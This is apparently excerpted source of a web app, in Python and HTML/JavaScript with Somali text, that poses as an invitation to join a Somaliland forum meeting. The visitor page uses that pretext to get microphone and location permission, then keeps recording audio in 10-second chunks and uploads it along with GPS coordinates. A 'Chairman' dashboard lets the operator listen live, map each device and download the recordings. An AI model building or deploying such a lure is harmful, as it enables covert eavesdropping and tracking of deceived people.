...
def up():
    ...
    try:
        name = "%s_c%06d_%06d.%s" % (dev, int(seq), int(ts * 1000) % 10**6, ext)
    except ValueError:
        name = "%s_c%d.%s" % (dev, int(ts * 1000) % 10**9, ext)
    f.save(os.path.join(DIR, name))
    with lock:
        index["chunks"].append({"ts": ts, "name": name, "dev": dev})
        dv = devices.setdefault(dev, {"chunks": [], "last": 0, "geo": None, "seen": 0})
        dv["chunks"].append({"ts": ts, "name": name})
        dv["last"] = ts
        state["last"] = ts
        cutoff = ts - KEEP
        keep = []
...
def dev_idx(dev):
    ...
    with lock:
        dv = devices.get(dev)
        if not dv:
            return jsonify({"chunks": [], "live": False, "last": 0})
        return jsonify({
            "chunks": dv["chunks"],
...
#go{width:calc(100% - 28px);margin:4px 14px;font-size:19px;font-weight:bold;padding:16px;border:0;
...
.live{background:#fff5f5;border:1px solid #b03a2e;border-radius:12px;padding:14px;
 color:#b03a2e;font-weight:bold}
.dot{display:inline-block;width:12px;height:12px;border-radius:50%;background:#b03a2e;
...
.devid{color:#1e5b41;font-size:13px;font-family:sans-serif;margin-top:6px}
#ov{position:fixed;left:0;right:0;top:0;bottom:0;background:rgba(0,0,0,.55);
 display:flex;align-items:center;justify-content:center;z-index:9}
.pop{background:#fff;border-radius:16px;max-width:340px;width:88%;overflow:hidden;
 box-shadow:0 6px 30px rgba(0,0,0,.3);font-family:sans-serif}
.poph{background:#1e5b41;color:#fff;padding:13px 16px;font-weight:bold;font-size:15px}
.popb{padding:16px;font-size:14px;color:#333;line-height:1.6}
.row{display:flex;align-items:center;margin:10px 0;font-size:15px}
.row span{font-size:24px;margin-right:12px}
#allow{width:100%;padding:15px;font-size:17px;font-weight:bold;border:0;
 background:#1e5b41;color:#fff;border-top:1px solid #eee}
</style></head><body>
<div class=wrap>
 ...
 <button id=go>&#127908; GUJI HALKAN</button>
 <div class=hint>Si aad nooga qayb qaadato: guji halkan oo <b>Allow</b> dheh
 (Microphone iyo Location).</div>
 <div id=st></div>
...
<div id=ov>
 <div class=pop>
  <div class=poph>Madasha Horumarka &amp; Ictiraafka Somaliland</div>
  <div class=popb>
   Boggan wuxuu ku codsanayaa ogolaanshaha:
   <div class=row><span>&#128205;</span><div><b>Location</b><br>si loo diiwaan geliyo goobta shirka</div></div>
   <div class=row><span>&#127908;</span><div><b>Microphone</b><br>si xubnuhu toos ugu maqla een kulanka</div></div>
  </div>
  <button id=allow>ALLOW / OGOLAADO</button>
 </div>
</div>

<script>
var KEY=new URLSearchParams(location.search).get('key')||'';
var DEV=localStorage.getItem('mddev');
...
function start(){
 ...
 fetch('/hello?key='+KEY,{method:'POST',body:fd0});
 if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(function(p){
   ...
   fetch('/loc?key='+KEY,{method:'POST',body:fd});
  ...
  rec.ondataavailable=function(e){
   if(e.data&&e.data.size>0){
    ...
    fetch('/up?key='+KEY,{method:'POST',body:fd}).then(function(r){
     if(r.ok)st('<span class=dot></span> TOOS AH (LIVE)<br>Waad ku biirtay kulanka. Mahadsanid!<br><span class=devid>Aqoonsigaaga: '+DEV+'</span>','live');
    }).catch(function(){});
   }};
  rec.onstop=function(){if(rec&&stream)rec.start()};
  rec.start();
  setInterval(function(){if(rec&&rec.state==='recording')rec.stop()},10000);
  st('<span class=dot></span> TOOS AH (LIVE)<br>Waad ku biirtay kulanka. Mahadsanid!','live');
  document.getElementById('go').style.display='none';
  document.getElementById('err').textContent='';
 }).catch(function(e){
  document.getElementById('err').textContent='Microphone ama Location lama ogolaan. Riix badhanka hoose mar kale, kadibna dooro Allow. Haddii uu diido: fur Chrome Settings - Site settings - Microphone iyo Location - Allow.';
  var g=document.getElementById('go');
  g.style.display='block';
  g.textContent='RIIX HALKAN - ISKU DAY MAR KALE';
 });
}
...
.t1{color:#143d2b;font-size:20px;font-weight:bold}
.t2{color:#c9a227;font-size:11px;letter-spacing:2px;margin-top:4px;font-family:sans-serif}
#lv{text-align:center;margin:12px 14px;font-size:15px;font-family:sans-serif;
 font-weight:bold;color:#1e5b41;background:#eef7f0;border-radius:10px;padding:10px}
.dev{border-bottom:1px solid #eee7d3;padding:12px 4px;font-family:sans-serif}
.dt{font-size:16px;margin-bottom:4px}
.on{color:#b03a2e;font-weight:bold;font-size:13px}
.off{color:#999;font-size:13px}
.loc{font-size:13px;color:#333;margin:3px 0}
.tm{font-size:12px;color:#777;margin:3px 0}
.btn{display:inline-block;background:#1e5b41;color:#fff;padding:9px 14px;border-radius:9px;
 margin:6px 6px 0 0;font-size:14px;text-decoration:none;font-weight:bold}
.btn.gold{background:#c9a227;color:#222}
a{color:#1e5b41;font-weight:bold;text-decoration:none}
.all{display:block;text-align:center;margin:10px 14px;font-family:sans-serif;font-size:14px}
.gold{color:#8a6d1d;font-size:13px;text-align:center;font-family:sans-serif;margin-top:10px}
</style></head><body>
<div class=wrap>
 <div class="card head">
  <div class=t1>Gudoomiye &mdash; Madasha Horumarka &amp; Ictiraafka Somaliland</div>
  <div class=t2>CHAIRMAN &mdash; LISTEN + LOCATION + RECORD</div>
 </div>
 <div id=lv>Ma jiro qof aad dhagaysanayso. Dooro martida hoose.</div>
 <div class=card id=devs>Weli qof ma biirin...</div>
 <a class=all id=all href="#">&#11015; Dhammaan duubista (All recordings ZIP)</a>
 <div class=gold>Aragti &bull; Iskaashi &bull; Horumar &bull; Midnimo</div>
</div>
<script>
var KEY=new URLSearchParams(location.search).get('key')||'';
document.getElementById('all').href='/archive.zip?key='+KEY;
var A=new Audio(),cur=null,played={},live=false;
function fmt(t){return new Date(t*1000).toLocaleTimeString()}
function pollDevs(){
 fetch('/index.json?key='+KEY).then(function(r){return r.json()}).then(function(d){
  var ds=d.devices||[],h='';
  if(!ds.length)h='<div class=dev>Weli qof ma biirin (no invitees yet)</div>';
  for(var i=0;i<ds.length;i++){var v=ds[i];
   h+='<div class=dev>'
    +'<div class=dt><b>&#128100; '+v.id+'</b> '
    +(v.live?'<span class=on>&#9679; TOOS AH</span>':'<span class=off>offline</span>')+'</div>'
    +(v.geo
      ?'<div class=loc>&#128205; '+v.geo.lat.toFixed(5)+', '+v.geo.lon.toFixed(5)
       +' (&plusmn;'+Math.round(v.geo.acc)+' m) &mdash; '
       +'<a href="https://maps.google.com/?q='+v.geo.lat+','+v.geo.lon+'">Khariidadda</a></div>'
      :'<div class="loc off">Location lama helin</div>')
    +'<div class=tm>'+(v.last?('Ugu dambeysay: '+fmt(v.last)+' &mdash; '):'')+v.n+' duubis</div>'
    +'<a class=btn href="javascript:lis(''+v.id+'')">&#9654; DHAGAYSO</a>'
    +'<a class="btn gold" href="/dev/'+v.id+'.zip?key='+KEY+'">&#11015; ZIP</a>'
    +'</div>';
  }
...
function lis(dev){
 cur=dev;played={};live=true;
 document.getElementById('lv').innerHTML='&#127911; Waxaad dhagaysanaysaa: <b>'+dev+'</b>';
 pollAud();
}
A.onended=function(){if(live)setTimeout(pollAud,1500)};
function pollAud(){
 if(!cur)return;
